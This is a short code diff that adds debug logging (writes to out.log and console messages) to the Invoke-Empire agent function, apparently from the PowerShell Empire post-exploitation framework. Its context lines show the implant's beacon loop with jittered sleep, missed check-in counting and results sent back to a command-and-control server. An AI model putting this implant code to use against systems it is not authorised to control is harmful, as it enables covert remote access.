@@ -776,10 +776,17 @@ function Invoke-Empire {
 			foreach ($Listener in $script:listeners){
 				SleepWithJitter($Listener)	
 				$response = (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
+                "got response:"|Out-File "out.log" -Append -NoClobber
+                $response |Out-File "out.log" -Append -NoClobber
+                "got response"
+                $response
+
 				if ($response){#a message got through
+                    "got a valid response"
 					$Listener["missedCheckins"] = 0
 					break
 				}
+                "got an invalid response"
 				$Listener["missedCheckins"] += 1
 			}
 			(& $script:CleanUpListeners)
@@ -1090,6 +1097,7 @@ function Invoke-Empire {
             $Offset += $(12 + $Length)
         }
 
+        "sending back results"|Out-File "out.log" -Append -NoClobber
         # send all the result packets back to the C2 server
         (& $SendMessage -Packets $ResultPackets)
     }
